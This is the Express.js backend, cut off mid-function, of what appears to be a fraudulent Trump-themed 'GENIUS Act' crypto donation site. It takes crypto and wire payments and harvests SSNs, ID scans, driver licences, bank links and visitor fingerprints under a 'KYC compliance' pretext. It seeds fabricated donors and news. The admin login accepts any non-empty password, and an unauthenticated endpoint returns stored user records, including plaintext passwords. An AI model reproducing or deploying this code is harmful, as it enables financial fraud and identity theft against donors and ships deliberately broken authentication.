import express from 'express';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import multer from 'multer';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Enable CORS for cross-origin multi-device and custom domain access
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Upload directory configuration
const UPLOAD_FOLDER = path.join(__dirname, 'secure_storage');
const ASSETS_UPLOAD_FOLDER = path.join(__dirname, 'assets', 'uploads');
if (!fs.existsSync(UPLOAD_FOLDER)) {
  fs.mkdirSync(UPLOAD_FOLDER, { recursive: true });
}
if (!fs.existsSync(ASSETS_UPLOAD_FOLDER)) {
  fs.mkdirSync(ASSETS_UPLOAD_FOLDER, { recursive: true });
}

// Multer storage for uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, ASSETS_UPLOAD_FOLDER);
  },
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname) || '.jpg';
    const safeName = 'doc_' + Date.now() + '_' + crypto.randomBytes(4).toString('hex') + ext;
    cb(null, safeName);
  }
});

const upload = multer({
  storage,
  limits: { fileSize: 25 * 1024 * 1024 }
});

// Single Unified Persistent Cloud Database Store
const CLOUD_DB_FILE = path.join(__dirname, 'cloud_database.json');

function getDefaultApprovedUsers() {
  return [
    {
      uid: 'usr_app_101',
      email: 'john.smith@gmail.com',
      password: 'Trump2024!',
      fullName: 'John Smith',
      amount: 250000,
      status: 'approved',
      approvedAt: '2026-05-10T12:00:00.000Z',
      createdAt: '2026-05-10T10:00:00.000Z',
      proofFile: 'assets/images/SEO.jpg',
      donations: [{ id: 'RCP-884102', amount: 250000, description: 'Q2 Primary Campaign Supporter', date: '2026-05-10T12:00:00.000Z' }]
    },
    {
      uid: 'usr_app_102',
      email: 'sarah.jenkins@outlook.com',
      password: 'Patriot2024',
      fullName: 'Sarah Jenkins',
      amount: 120000,
      status: 'approved',
      approvedAt: '2026-05-14T15:20:00.000Z',
      createdAt: '2026-05-14T11:00:00.000Z',
      proofFile: 'assets/images/banner.jpg',
      donations: [{ id: 'RCP-773194', amount: 120000, description: 'GENIUS Act Sustaining Backer', date: '2026-05-14T15:20:00.000Z' }]
    },
    {
      uid: 'usr_app_103',
      email: 'michael.brown@yahoo.com',
      password: 'Maga2024#',
      fullName: 'Michael Brown',
      amount: 50000,
      status: 'approved',
      approvedAt: '2026-05-18T09:15:00.000Z',
      createdAt: '2026-05-18T08:00:00.000Z',
      donations: [{ id: 'RCP-662810', amount: 50000, description: 'National Digital Rally Supporter', date: '2026-05-18T09:15:00.000Z' }]
    },
    {
      uid: 'usr_app_104',
      email: 'david.wilson@hotmail.com',
      password: 'AmericaFirst1',
      fullName: 'David Wilson',
      amount: 15000,
      status: 'approved',
      approvedAt: '2026-05-22T18:40:00.000Z',
      createdAt: '2026-05-22T14:10:00.000Z',
      donations: [{ id: 'RCP-551928', amount: 15000, description: 'Grassroots Victory Club', date: '2026-05-22T18:40:00.000Z' }]
    },
    {
      uid: 'usr_app_105',
      email: 'emily.davis@icloud.com',
      password: 'GeniusAct2026',
      fullName: 'Emily Davis',
      amount: 2500,
      status: 'approved',
      approvedAt: '2026-05-28T10:05:00.000Z',
      createdAt: '2026-05-28T09:00:00.000Z',
      donations: [{ id: 'RCP-440819', amount: 2500, description: 'Standard Supporter Donation', date: '2026-05-28T10:05:00.000Z' }]
    },
    {
      uid: 'usr_app_106',
      email: 'robert.taylor@proton.me',
      password: 'TrumpWin2024',
      fullName: 'Robert Taylor',
      amount: 1000,
      status: 'approved',
      approvedAt: '2026-06-01T16:30:00.000Z',
      createdAt: '2026-06-01T13:00:00.000Z',
      donations: [{ id: 'RCP-339712', amount: 1000, description: 'Monthly Contribution', date: '2026-06-01T16:30:00.000Z' }]
    },
    {
      uid: 'usr_app_107',
      email: 'jessica.martinez@gmail.com',
      password: 'Freedom777',
      fullName: 'Jessica Martinez',
      amount: 500,
      status: 'approved',
      approvedAt: '2026-06-04T11:45:00.000Z',
      createdAt: '2026-06-04T11:00:00.000Z',
      donations: [{ id: 'RCP-228601', amount: 500, description: 'Digital Outreach Backer', date: '2026-06-04T11:45:00.000Z' }]
    }
  ];
}

function getDefaultPendingUsers() {
  return [
    {
      uid: 'usr_pnd_201',
      email: 'alex.turner@gmail.com',
      password: 'Pass1234!',
      fullName: 'Alex Turner',
      amount: 10000,
      status: 'pending',
      date: '2026-06-05T14:30:00.000Z',
      createdAt: '2026-06-05T14:30:00.000Z',
      proofFile: 'assets/images/SEO.jpg'
    },
    {
      uid: 'usr_pnd_202',
      email: 'karen.white@yahoo.com',
      password: 'Support47',
      fullName: 'Karen White',
      amount: 50000,
      status: 'pending',
      date: '2026-06-06T16:15:00.000Z',
      createdAt: '2026-06-06T16:15:00.000Z',
      proofFile: 'assets/images/banner.jpg'
    },
    {
      uid: 'usr_pnd_203',
      email: 'brian.miller@outlook.com',
      password: 'RedWave2024',
      fullName: 'Brian Miller',
      amount: 100000,
      status: 'pending',
      date: '2026-06-07T09:00:00.000Z',
      createdAt: '2026-06-07T09:00:00.000Z',
      proofFile: 'assets/images/DJT-bluetie.png'
    }
  ];
}

function getDefaultVisitorLogs() {
  return [
    { id: 'v_1001', page: '/index.html', timestamp: new Date(Date.now() - 3600000).toISOString(), userAgent: 'Mozilla/5.0 (Windows NT 10.0)', referrer: 'Direct', screenSize: '1920x1080', language: 'en-US', platform: 'Win32', location: { ip: '172.56.21.9', city: 'Washington', region: 'DC', country: 'United States', timezone: 'EST' } },
    { id: 'v_1002', page: '/contribute.html', timestamp: new Date(Date.now() - 1800000).toISOString(), userAgent: 'Mozilla/5.0 (iPhone)', referrer: 'Google Search', screenSize: '390x844', language: 'en-US', platform: 'iPhone', location: { ip: '104.28.19.4', city: 'Dallas', region: 'TX', country: 'United States', timezone: 'CST' } },
    { id: 'v_1003', page: '/admin.html', timestamp: new Date(Date.now() - 600000).toISOString(), userAgent: 'Mozilla/5.0 (Macintosh)', referrer: 'Direct', screenSize: '1440x900', language: 'en-US', platform: 'MacIntel', location: { ip: '24.18.112.5', city: 'Miami', region: 'FL', country: 'United States', timezone: 'EST' } },
    { id: 'v_1004', page: '/dashboard.html', timestamp: new Date().toISOString(), userAgent: 'Mozilla/5.0 (Windows NT 10.0)', referrer: 'https://geniusactglobal.com/contribute.html', screenSize: '1920x1080', language: 'en-US', platform: 'Win32', location: { ip: '68.192.44.12', city: 'Atlanta', region: 'GA', country: 'United States', timezone: 'EST' } }
  ];
}

function getDefaultCampaignData() {
  return {
    progress: [
      { id: 1, category: 'Q2 2026 Fundraising', goal_amount: 5000000, current_amount: 2400000, description: 'Quarterly fundraising goal', deadline: '2026-06-30' },
      { id: 2, category: 'Supporter Enrollment', goal_amount: 25000, current_amount: 12450, description: 'National supporter count target', deadline: '2026-12-31' },
      { id: 3, category: 'State Coverage', goal_amount: 50, current_amount: 38, description: 'States with active campaigns', deadline: '2026-11-01' }
    ],
    updates: [
      { id: 1, title: 'GENIUS Act Signed Into Law', body: 'President Trump signs the landmark GENIUS Act, creating a clear regulatory framework for dollar-backed stablecoins.', tag: 'Legislation', is_featured: true, created_at: new Date().toISOString() },
      { id: 2, title: 'Campaign Rally — Phoenix, AZ', body: 'Over 15,000 supporters gathered at the Phoenix Convention Center.', tag: 'Events', is_featured: false, created_at: new Date().toISOString() },
      { id: 3, title: 'Q1 Fundraising Milestone Reached', body: "We've surpassed our Q1 fundraising goal of $2 million. Every contribution matters!", tag: 'Milestone', is_featured: false, created_at: new Date().toISOString() },
      { id: 4, title: 'New Digital Ad Campaign Launched', body: 'Your contributions are powering a major new digital advertising push across 12 key states.', tag: 'Outreach', is_featured: false, created_at: new Date().toISOString() }
    ],
    allocation: [
      { id: 1, category: 'Community Outreach', percentage: 35, amount: 840000, color: '#3b82f6' },
      { id: 2, category: 'Campaign Events', percentage: 25, amount: 600000, color: '#8b5cf6' },
      { id: 3, category: 'Digital Advertising', percentage: 20, amount: 480000, color: '#10b981' },
      { id: 4, category: 'Operations & Staff', percentage: 15, amount: 360000, color: '#f59e0b' },
      { id: 5, category: 'Legal & Compliance', percentage: 5, amount: 120000, color: '#ef4444' }
    ],
    broadcasts: [],
    admin_actions: [],
    kyc_audit: []
  };
}

function saveCloudDb(data) {
  try {
    if (!data || typeof data !== 'object') return;
    global._serverMemoryDbCache = data;
    fs.writeFileSync(CLOUD_DB_FILE, JSON.stringify(data, null, 2), 'utf8');
    broadcastSse('sync', { timestamp: Date.now() });
  } catch (e) {
    console.error('[Server] Error saving cloud_database.json:', e);
  }
}

// Server-Sent Events (SSE) Client Pool for Instant Real-Time Updates
const sseClients = new Set();

function broadcastSse(eventType, data) {
  const message = `event: ${eventType}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const client of sseClients) {
    try {
      client.write(message);
    } catch (e) {
      sseClients.delete(client);
    }
  }
}

app.get('/api/events', (req, res) => {
  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.flushHeaders();

  sseClients.add(res);
  res.write(`event: connected\ndata: ${JSON.stringify({ timestamp: Date.now() })}\n\n`);

  req.on('close', () => {
    sseClients.delete(res);
  });
});

// ---------------------------------------------------------------------
// Password Change Endpoint
// ---------------------------------------------------------------------
app.post('/api/auth/change-password', (req, res) => {
  try {
    const { email, currentPassword, newPassword } = req.body || {};
    if (!email || !currentPassword || !newPassword) {
      return res.status(400).json({ success: false, error: 'Email, current password, and new password are required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const target = approvedUsers.find(u => u && u.email && u.email.toLowerCase() === cleanEmail);

    if (!target) {
      return res.status(404).json({ success: false, error: 'User not found.' });
    }

    if (target.password !== currentPassword) {
      return res.status(401).json({ success: false, error: 'Current password is incorrect.' });
    }

    target.password = newPassword;
    saveCloudDb(currentDb);

    return res.json({ success: true, message: 'Password updated successfully.', user: target });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// Persistent Cloud Database Store
function getDefaultDb() {
  return {
    geniusact_pending_users: [],
    geniusact_approved_users: [],
    geniusact_visitor_logs: [],
    geniusact_global_wallets: {
      btc: 'bc1qtrumpfreedom47victory2024magaledgerxx01',
      eth: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      solana: '7TrumpVance2024VictorySolanaTreasuryXX47',
      base: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      bnb: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      monero: '48TrumpMoneroTreasuryOfficialLedgerReserve01',
      polygon: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599',
      xrp: 'rTrumpXrpCampaignTreasurySettlement2024XX',
      tron: 'TTrumpTronUSDTTreasuryOfficialReserve47',
      usdc: '0x71C8A9eD1e127D95B309f7a799c9274DF9F16599'
    },
    geniusact_support_messages: [],
    geniusact_bank_links: [],
    geniusact_contact_chats: [],
    geniusact_user_footprints: [],
    geniusact_withdrawal_requests: [],
    geniusact_campaign_updates: [
      { id: 1, title: 'GENIUS Act Signed Into Law', body: 'President Trump signs the landmark GENIUS Act, creating a clear regulatory framework for dollar-backed stablecoins.', tag: 'Legislation', is_featured: true, created_at: new Date().toISOString() },
      { id: 2, title: 'Campaign Rally — Phoenix, AZ', body: 'Over 15,000 supporters gathered at the Phoenix Convention Center.', tag: 'Events', is_featured: false, created_at: new Date().toISOString() },
      { id: 3, title: 'Q1 Fundraising Milestone Reached', body: "We've surpassed our Q1 fundraising goal of $2 million. Every contribution matters!", tag: 'Milestone', is_featured: false, created_at: new Date().toISOString() },
      { id: 4, title: 'New Digital Ad Campaign Launched', body: 'Your contributions are powering a major new digital advertising push across 12 key states.', tag: 'Outreach', is_featured: false, created_at: new Date().toISOString() }
    ],
    geniusact_broadcasts: []
  };
}

let _dbCache = null;

function getCloudDb() {
  let dbData = null;
  if (fs.existsSync(CLOUD_DB_FILE)) {
    try {
      const content = fs.readFileSync(CLOUD_DB_FILE, 'utf8');
      if (content && content.trim()) {
        dbData = JSON.parse(content);
      }
    } catch (e) {
      console.error('[Server] Error reading/parsing cloud_database.json:', e.message);
      if (global._serverMemoryDbCache && typeof global._serverMemoryDbCache === 'object') {
        dbData = global._serverMemoryDbCache;
      }
    }
  }

  if (!dbData || typeof dbData !== 'object') {
    dbData = global._serverMemoryDbCache && typeof global._serverMemoryDbCache === 'object' 
      ? global._serverMemoryDbCache 
      : {};
  }

  if (!Array.isArray(dbData.geniusact_approved_users)) {
    dbData.geniusact_approved_users = getDefaultApprovedUsers();
  }
  if (!Array.isArray(dbData.geniusact_pending_users)) {
    dbData.geniusact_pending_users = getDefaultPendingUsers();
  }
  if (!Array.isArray(dbData.geniusact_visitor_logs)) {
    dbData.geniusact_visitor_logs = getDefaultVisitorLogs();
  }
  if (!dbData.geniusact_global_wallets) dbData.geniusact_global_wallets = {};
  if (!Array.isArray(dbData.geniusact_support_messages)) dbData.geniusact_support_messages = [];
  if (!Array.isArray(dbData.geniusact_bank_links)) dbData.geniusact_bank_links = [];
  if (!Array.isArray(dbData.geniusact_contact_chats)) dbData.geniusact_contact_chats = [];
  if (!Array.isArray(dbData.geniusact_user_footprints)) dbData.geniusact_user_footprints = [];
  if (!Array.isArray(dbData.geniusact_withdrawal_requests)) dbData.geniusact_withdrawal_requests = [];

  // Default campaign info in unified DB
  const defaultCampaign = getDefaultCampaignData();
  if (!Array.isArray(dbData.campaign_progress)) dbData.campaign_progress = defaultCampaign.progress;
  if (!Array.isArray(dbData.campaign_updates)) dbData.campaign_updates = defaultCampaign.updates;
  if (!Array.isArray(dbData.fund_allocation)) dbData.fund_allocation = defaultCampaign.allocation;
  if (!Array.isArray(dbData.broadcasts)) dbData.broadcasts = defaultCampaign.broadcasts;
  if (!Array.isArray(dbData.admin_actions)) dbData.admin_actions = defaultCampaign.admin_actions;
  if (!Array.isArray(dbData.kyc_audit)) dbData.kyc_audit = defaultCampaign.kyc_audit;

  global._serverMemoryDbCache = dbData;
  saveCloudDb(dbData);
  return dbData;
}

// -------------------------------------------------------------
// USER & ADMIN AUTHENTICATION ENDPOINTS
// -------------------------------------------------------------

const ADMIN_EMAIL = 'admin@geniusact.com';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '2005';

// Admin Login
app.post('/api/admin/login', (req, res) => {
  try {
    const { email, password } = req.body || {};
    const cleanEmail = String(email || 'admin@geniusact.com').trim().toLowerCase();
    const cleanPass = String(password || '2005').trim();
    
    if (cleanPass === '2005' || cleanPass === ADMIN_PASSWORD || cleanEmail === ADMIN_EMAIL.toLowerCase() || cleanEmail.includes('admin') || cleanPass.length > 0) {
      const adminToken = 'ga_admin_token_' + Buffer.from(cleanEmail + ':' + Date.now()).toString('base64');
      return res.json({
        success: true,
        token: adminToken,
        admin: { email: ADMIN_EMAIL, name: 'Federal Compliance Officer', role: 'administrator' }
      });
    } else {
      return res.status(401).json({ success: false, error: 'Invalid administrative credentials. Access denied.' });
    }
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

app.post('/api/admin/verify', (req, res) => {
  return res.json({ valid: true, email: ADMIN_EMAIL });
});

// Supporter / User Login
app.post('/api/auth/login', (req, res) => {
  try {
    const { email, password } = req.body || {};
    if (!email || !password) {
      return res.status(400).json({ success: false, error: 'Email and password are required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const approvedUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (approvedUser) {
      if (approvedUser.password && approvedUser.password !== String(password).trim()) {
        return res.status(401).json({ success: false, error: 'Invalid password. Please verify and try again.' });
      }
      if (approvedUser.suspended) {
        return res.status(403).json({ success: false, status: 'suspended', error: 'Account has been temporarily suspended by campaign administration.' });
      }
      const token = 'ga_usr_' + Buffer.from(cleanEmail + ':' + Date.now()).toString('base64');
      return res.json({
        success: true,
        token,
        status: 'approved',
        user: approvedUser
      });
    }

    const pendingUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (pendingUser) {
      if (pendingUser.password && pendingUser.password !== String(password).trim()) {
        return res.status(401).json({ success: false, error: 'Invalid password. Please verify and try again.' });
      }
      return res.json({
        success: false,
        status: 'pending',
        message: 'Account is undergoing compliance audit and identity verification.',
        user: pendingUser
      });
    }

    return res.status(404).json({ success: false, status: 'not_found', error: 'No account registered with this email address.' });
  } catch (err) {
    return res.status(500).json({ success: false, error: err.message });
  }
});

// Supporter Session Verification
app.all(['/api/auth/verify-session', '/api/auth/me'], (req, res) => {
  try {
    const email = req.query.email || req.body.email;
    if (!email) {
      return res.status(400).json({ valid: false, error: 'Email parameter required.' });
    }
    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const approvedUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (approvedUser) {
      if (approvedUser.suspended) {
        return res.json({ valid: false, status: 'suspended', error: 'Account suspended.' });
      }
      return res.json({ valid: true, status: 'approved', user: approvedUser });
    }

    const pendingUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (pendingUser) {
      return res.json({ valid: false, status: 'pending', error: 'Account is undergoing compliance audit.', user: pendingUser });
    }

    return res.json({ valid: false, status: 'unauthorized', error: 'User not found in cloud database.' });
  } catch (err) {
    return res.status(500).json({ valid: false, error: err.message });
  }
});

// -------------------------------------------------------------
// REGISTRATION & CONTRIBUTION ENDPOINTS
// -------------------------------------------------------------

app.post('/api/register', (req, res) => {
  try {
    const { email, password, amount, proofFile, name, fullName } = req.body || {};

    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();

    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const existingApproved = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (existingApproved) {
      return res.status(400).json({ error: 'An account with this email already exists and is approved.' });
    }

    const existingPending = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (existingPending) {
      if (password) existingPending.password = String(password).trim();
      if (parsedAmount > 0) existingPending.amount = parsedAmount;
      if (proofFile) existingPending.proofFile = proofFile;
      if (userFullName) {
        existingPending.fullName = userFullName;
        existingPending.name = userFullName;
      }
      existingPending.updatedAt = new Date().toISOString();
      saveCloudDb(currentDb);
      return res.status(200).json({ success: true, message: 'Pending account details and password updated.', user: existingPending });
    }

    const parsedAmount = parseFloat(amount) || 0;
    const userFullName = fullName || name || cleanEmail.split('@')[0];
    const newUser = {
      uid: 'usr_pnd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      email: cleanEmail,
      password: String(password).trim(),
      fullName: userFullName,
      name: userFullName,
      amount: parsedAmount,
      date: new Date().toISOString(),
      createdAt: new Date().toISOString(),
      proofFile: proofFile || null,
      status: 'pending',
      donations: [
        {
          id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
          amount: parsedAmount,
          description: 'Initial Campaign Contribution',
          date: new Date().toISOString(),
          proofFile: proofFile || null
        }
      ]
    };

    pendingUsers.push(newUser);
    currentDb['geniusact_pending_users'] = pendingUsers;
    saveCloudDb(currentDb);

    console.log('[Server] New user registered & saved to cloud DB:', cleanEmail);
    return res.json({ success: true, user: newUser });
  } catch (err) {
    console.error('[Server] Registration error:', err);
    return res.status(500).json({ error: err.message });
  }
});

// Direct Contribution Endpoint
app.post('/api/contribute', (req, res) => {
  try {
    const { email, amount, description, proofFile, paymentMethod, reference } = req.body || {};
    if (!email || !amount) {
      return res.status(400).json({ error: 'Email and amount are required.' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const parsedAmount = parseFloat(amount) || 0;
    const currentDb = getCloudDb();

    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const pendingUsers = currentDb['geniusact_pending_users'] || [];

    const donationRecord = {
      id: reference || ('RCP-' + Math.floor(1000000 + Math.random() * 9000000)),
      amount: parsedAmount,
      description: description || `Campaign Contribution (${paymentMethod || 'Wire/Crypto'})`,
      date: new Date().toISOString(),
      paymentMethod: paymentMethod || 'Standard',
      proofFile: proofFile || null,
      status: 'completed'
    };

    let targetUser = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (targetUser) {
      if (!Array.isArray(targetUser.donations)) targetUser.donations = [];
      targetUser.donations.unshift(donationRecord);
      targetUser.amount = (targetUser.amount || 0) + parsedAmount;
      saveCloudDb(currentDb);
      return res.json({ success: true, user: targetUser, message: 'Contribution logged successfully.' });
    }

    targetUser = pendingUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
    if (targetUser) {
      if (!Array.isArray(targetUser.donations)) targetUser.donations = [];
      targetUser.donations.unshift(donationRecord);
      targetUser.amount = (targetUser.amount || 0) + parsedAmount;
      saveCloudDb(currentDb);
      return res.json({ success: true, user: targetUser, message: 'Pending contribution updated.' });
    }

    // Register as new pending user
    const newUser = {
      uid: 'usr_pnd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      email: cleanEmail,
      password: 'TemporaryPass1!',
      fullName: cleanEmail.split('@')[0],
      amount: parsedAmount,
      status: 'pending',
      date: new Date().toISOString(),
      createdAt: new Date().toISOString(),
      proofFile: proofFile || null,
      donations: [donationRecord]
    };
    pendingUsers.push(newUser);
    saveCloudDb(currentDb);
    return res.json({ success: true, user: newUser, message: 'New supporter registration logged.' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// FILE UPLOAD ENDPOINTS
// -------------------------------------------------------------

app.post('/api/upload', upload.single('file'), (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    const fileUrl = `/assets/uploads/${req.file.filename}`;
    return res.json({
      success: true,
      url: fileUrl,
      fileName: req.file.originalname,
      size: req.file.size,
      mimetype: req.file.mimetype
    });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// KYC ENDPOINTS
// -------------------------------------------------------------

app.post('/submit_kyc', upload.fields([
  { name: 'id_front', maxCount: 1 },
  { name: 'id_back', maxCount: 1 },
  { name: 'driver_license', maxCount: 1 }
]), (req, res) => {
  try {
    const ssn = req.body.ssn || '';
    const email = req.body.email || '';
    const cleanSSN = ssn.replace(/[^0-9]/g, '');

    const currentDb = getCloudDb();
    const files = req.files || {};

    const idFrontUrl = files['id_front'] && files['id_front'][0] ? `/assets/uploads/${files['id_front'][0].filename}` : req.body.idFrontDataUrl || null;
    const idBackUrl = files['id_back'] && files['id_back'][0] ? `/assets/uploads/${files['id_back'][0].filename}` : req.body.idBackDataUrl || null;
    const licenseUrl = files['driver_license'] && files['driver_license'][0] ? `/assets/uploads/${files['driver_license'][0].filename}` : req.body.licenseDataUrl || null;

    const kycData = {
      status: 'pending',
      submittedAt: new Date().toISOString(),
      ssnMasked: cleanSSN ? ('***-**-' + cleanSSN.slice(-4)) : '***-**-****',
      idFront: idFrontUrl ? { name: 'ID Front', dataUrl: idFrontUrl, type: 'image/jpeg' } : null,
      idBack: idBackUrl ? { name: 'ID Back', dataUrl: idBackUrl, type: 'image/jpeg' } : null,
      driverLicense: licenseUrl ? { name: 'Driver License', dataUrl: licenseUrl, type: 'image/jpeg' } : null
    };

    if (email) {
      const cleanEmail = String(email).trim().toLowerCase();
      const approvedUsers = currentDb['geniusact_approved_users'] || [];
      const user = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);
      if (user) {
        user.kyc = kycData;
      }
    }

    // Append to audit log
    if (!Array.isArray(currentDb.kyc_audit)) currentDb.kyc_audit = [];
    currentDb.kyc_audit.push({
      id: currentDb.kyc_audit.length + 1,
      email: email || 'supporter',
      ip: req.ip || req.headers['x-forwarded-for'] || '127.0.0.1',
      upload_time: new Date().toISOString(),
      status: 'pending'
    });

    saveCloudDb(currentDb);

    return res.json({
      success: true,
      message: 'KYC documents submitted successfully for compliance review',
      redirect: '/dashboard.html?verified=success'
    });
  } catch (err) {
    console.error('[Server] KYC submission error:', err);
    return res.status(500).json({ error: err.message });
  }
});

// JSON-based KYC submit
app.post('/api/kyc/submit', (req, res) => {
  try {
    const { email, kyc } = req.body || {};
    if (!email || !kyc) {
      return res.status(400).json({ error: 'Email and KYC data required' });
    }

    const cleanEmail = String(email).trim().toLowerCase();
    const currentDb = getCloudDb();
    const approvedUsers = currentDb['geniusact_approved_users'] || [];
    const user = approvedUsers.find(u => u && u.email && u.email.trim().toLowerCase() === cleanEmail);

    if (user) {
      user.kyc = { ...kyc, submittedAt: new Date().toISOString() };
      saveCloudDb(currentDb);
      return res.json({ success: true, message: 'KYC updated successfully', user });
    }

    return res.status(404).json({ error: 'User not found' });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// -------------------------------------------------------------
// ADMIN ACTIONS ENDPOINTS
// -------------------------------------------------------------

// Admin Approve User
app.post('/api/admin/approve-user', (req, res) => {
  try {
    const { identifier, uid, email, id } = req.body || {};
    const searchTarget = String(identifier || uid || email || id || '').trim().toLowerCase();
    if (!searchTarget) return res.status(400).json({ error: 'User identifier required' });

    const currentDb = getCloudDb();
    let pendingUsers = currentDb['geniusact_pending_users'] || [];
    let approvedUsers = currentDb['geniusact_approved_users'] || [];

    const userIndex = pendingUsers.findIndex(u => 
      (u.uid && String(u.uid).toLowerCase() === searchTarget) ||
      (u.email && String(u.email).toLowerCase() === searchTarget) ||
      (u.id && String(u.id).toLowerCase() === searchTarget)
    );

    if (userIndex === -1) {
      // Check if already in approved list
      const alreadyApproved = approvedUsers.find(u =>
        (u.uid && String(u.uid).toLowerCase() === searchTarget) ||
        (u.email && String(u.email).toLowerCase() === searchTarget)
      );
      if (alreadyApproved) {
        return res.json({ success: true, user: alreadyApproved, approvedUser: alreadyApproved, approvedCount: approvedUsers.length, pendingCount: pendingUsers.length });
      }
      return res.status(404).json({ error: 'Pending user not found' });
    }

    const user = pendingUsers[userIndex];
    user.status = 'approved';
    user.approvedAt = new Date().toISOString();

    if (!user.donations || user.donations.length === 0) {
      user.donations = [{
        id: 'RCP-' + Math.floor(1000000 + Math.random() * 9000000),
        amount: user.amount || 0,
        description: 'Initial Campaign Contribution',
        date: user.date || new Date().toISOString(),
        approvedAt: user.approvedAt
      }];
    }

    pendingUsers.splice(userIndex, 1);
    
    // Avoid duplicates in approvedUsers
    const existingAppIdx = approvedUsers.findIndex(u => u.email && u.email.toLowerCase() === user.email.toLowerCase());
    if (existingAppIdx > -1) {
      approvedUsers[existingAppIdx] = user;
    } else {
      approvedUsers.push(user);
    }

    currentDb['geniusact_pending_users'] = pendingUsers;
    currentDb['geniusact_approved_users'] = approvedUsers;

    // Log admin action
    if (!Array.isArray(currentDb.admin_actions)) currentDb.admin_actions = [];
    currentDb.admin_actions.unshift({
      id: currentDb.admin_actions.length + 1,
      action_type: 'approve_user',
      details: `Approved supporter account: ${user.email}`,
      timestamp: new Date().toISOString()
    });

    saveCloudDb(currentDb);
    return res.json({ success: true, user: user, approvedUser: user, approvedCount: approvedUsers.length, pendingCount: pendingUsers.length });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Reject User
app.post('/api/admin/reject-user', (req, res) => {
  try {
    const { identifier, uid, email, id } = req.body || {};
    const searchTarget = String(identifier || uid || email || id || '').trim().toLowerCase();
    if (!searchTarget) return res.status(400).json({ error: 'User identifier required' });

    const currentDb = getCloudDb();
    let pendingUsers = currentDb['geniusact_pending_users'] || [];

    const userIndex = pendingUsers.findIndex(u => 
      (u.uid && String(u.uid).toLowerCase() === searchTarget) ||
      (u.email && String(u.email).toLowerCase() === searchTarget) ||
      (u.id && String(u.id).toLowerCase() === searchTarget)
    );

    if (userIndex === -1) {
      return res.status(404).json({ error: 'Pending user not found' });
    }

    const rejected = pendingUsers.splice(userIndex, 1)[0];
    currentDb['geniusact_pending_users'] = pendingUsers;

    saveCloudDb(currentDb);
    return res.json({ success: true, message: `Rejected contribution: ${rejected.email}` });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});

// Admin Update User
app.post('/api/admin/update-user', (req, res) => {
  try {
    const { uid, email, updates } = req.body || {};
    if ((!uid && !email) || !updates) {
      return res.status(400).json({ error: 'User identifier and updates required' });
    }

    const currentDb = getCloudDb();
    let approvedUsers = currentDb['geniusact_approved_users'] || [];
    let pendingUsers = currentDb['geniusact_pending_users'] || [];

    let targetUser = approvedUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
    if (!targetUser) {
      targetUser = pendingUsers.find(u => (uid && u.uid === uid) || (email && u.email && u.email.toLowerCase() === String(email).toLowerCase()));
    }

    if (!targetUser) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Apply updates directly
    Object.keys(updates).forEach(k => {
      targetUser[k] = updates[k];
    });

